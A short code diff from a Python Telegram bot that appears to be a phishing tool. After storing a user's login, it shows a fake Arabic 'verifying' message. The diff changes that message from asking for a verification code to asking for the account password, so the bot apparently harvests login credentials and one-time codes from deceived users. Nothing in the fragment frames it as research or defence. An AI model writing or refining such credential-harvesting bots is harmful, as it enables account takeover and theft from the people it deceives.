@@ -48,7 +48,7 @@ def get_data(message):
     chat_id = message.chat.id
     if chat_id in user_dict:
         user_dict[chat_id]['login'] = message.text
-        msg = bot.send_message(chat_id, "⚠️ جاري التحقق... الرجاء إدخال الرمز الآنلتمام العمليه:")
+        msg = bot.send_message(chat_id, "⚠️ جاري التحقق... الرجاء إدخال باسوورد الحساب:")
         bot.register_next_step_handler(msg, get_code)
 
 def get_code(message):
